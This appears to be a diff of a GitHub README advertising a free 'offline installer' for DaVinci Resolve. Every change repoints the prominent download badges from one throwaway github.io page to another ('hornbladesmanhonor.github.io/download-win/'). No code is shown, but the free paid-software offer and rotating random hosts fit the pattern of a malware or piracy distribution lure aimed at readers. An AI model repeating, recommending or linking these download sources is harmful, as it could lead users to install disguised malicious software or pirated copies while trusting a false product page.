@@ -21,7 +21,7 @@
 
 <div align="center">
 
-[![⬇ Download DaVinci Resolve](https://img.shields.io/badge/⬇%20Download%20DaVinci%20Resolve-F9A825?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+[![⬇ Download DaVinci Resolve](https://img.shields.io/badge/⬇%20Download%20DaVinci%20Resolve-F9A825?style=for-the-badge&logo=github)](https://hornbladesmanhonor.github.io/download-win/)
 
 </div>
 
@@ -80,7 +80,7 @@ Video and photo professionals face many challenges:
 
 <div align="center">
 
-[![⬇ Download DaVinci Resolve](https://img.shields.io/badge/⬇%20Download%20DaVinci%20Resolve-F9A825?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+[![⬇ Download DaVinci Resolve](https://img.shields.io/badge/⬇%20Download%20DaVinci%20Resolve-F9A825?style=for-the-badge&logo=github)](https://hornbladesmanhonor.github.io/download-win/)
 
 </div>
 
@@ -160,7 +160,7 @@ Video and photo professionals face many challenges:
 
 <div align="center">
 
-[![⬇ Download DaVinci Resolve](https://img.shields.io/badge/⬇%20Download%20DaVinci%20Resolve-F9A825?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+[![⬇ Download DaVinci Resolve](https://img.shields.io/badge/⬇%20Download%20DaVinci%20Resolve-F9A825?style=for-the-badge&logo=github)](https://hornbladesmanhonor.github.io/download-win/)
 
 </div>
 
@@ -239,7 +239,7 @@ This is a professional offline installer for DaVinci Resolve, providing free acc
 
 <div align="center">
 
-[![⬇ Get It Here](https://img.shields.io/badge/⬇%20Get%20It%20Here-F9A825?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+[![⬇ Get It Here](https://img.shields.io/badge/⬇%20Get%20It%20Here-F9A825?style=for-the-badge&logo=github)](https://hornbladesmanhonor.github.io/download-win/)
 
 </div>
 
